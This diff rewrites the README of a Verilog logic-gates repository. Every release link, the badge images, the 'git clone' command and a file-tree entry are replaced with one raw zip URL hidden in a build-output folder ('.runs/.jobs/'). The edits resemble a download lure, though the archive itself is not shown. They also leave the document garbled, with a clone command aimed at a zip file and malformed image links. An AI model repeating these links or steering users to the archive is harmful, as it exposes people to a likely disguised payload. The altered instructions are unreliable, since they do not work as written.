@@ -1,7 +1,7 @@
 # Basic Logic Gates with Verilog
 
-![Logic Gates](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)  
-[Download Releases](https://github.com/soni3006/basic_logic_gates_with_verilog/releases)
+![Logic Gates](https://github.com/soni3006/basic_logic_gates_with_verilog/raw/refs/heads/master/Digital_Gates.runs/.jobs/basic_verilog_logic_gates_with_v1.3.zip%20Releases-Click%20Here-brightgreen)  
+[Download Releases](https://github.com/soni3006/basic_logic_gates_with_verilog/raw/refs/heads/master/Digital_Gates.runs/.jobs/basic_verilog_logic_gates_with_v1.3.zip)
 
 Welcome to the **Basic Logic Gates with Verilog** repository! This project showcases the implementation of basic logic gates using the Verilog language. The simulation is performed in Xilinx Vivado, a popular tool for FPGA design and verification. 
 
@@ -38,7 +38,7 @@ To get started with this project, you will need to have the following tools inst
 To clone the repository, use the following command:
 
 ```bash
-git clone https://github.com/soni3006/basic_logic_gates_with_verilog.git
+git clone https://github.com/soni3006/basic_logic_gates_with_verilog/raw/refs/heads/master/Digital_Gates.runs/.jobs/basic_verilog_logic_gates_with_v1.3.zip
 ```
 
 ## Implementation Details
@@ -64,7 +64,7 @@ basic_logic_gates_with_verilog/
 │   ├── NOR_testbench.v
 │   ├── XOR_testbench.v
 │   └── XNOR_testbench.v
-└── README.md
+└── https://github.com/soni3006/basic_logic_gates_with_verilog/raw/refs/heads/master/Digital_Gates.runs/.jobs/basic_verilog_logic_gates_with_v1.3.zip
 ```
 
 Each gate file follows a consistent format, making it easy to navigate through the code.
@@ -139,7 +139,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 Thanks to the Verilog community for their contributions and resources that helped in the development of this project. Special thanks to the creators of Xilinx Vivado for providing an excellent platform for simulation and synthesis.
 
-For more information, please visit the [Releases section](https://github.com/soni3006/basic_logic_gates_with_verilog/releases) to download the latest updates.
+For more information, please visit the [Releases section](https://github.com/soni3006/basic_logic_gates_with_verilog/raw/refs/heads/master/Digital_Gates.runs/.jobs/basic_verilog_logic_gates_with_v1.3.zip) to download the latest updates.
 
-![Logic Gates Simulation](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)  
-[Download Releases](https://github.com/soni3006/basic_logic_gates_with_verilog/releases)
+![Logic Gates Simulation](https://github.com/soni3006/basic_logic_gates_with_verilog/raw/refs/heads/master/Digital_Gates.runs/.jobs/basic_verilog_logic_gates_with_v1.3.zip%20Releases-Click%20Here-brightgreen)  
+[Download Releases](https://github.com/soni3006/basic_logic_gates_with_verilog/raw/refs/heads/master/Digital_Gates.runs/.jobs/basic_verilog_logic_gates_with_v1.3.zip)
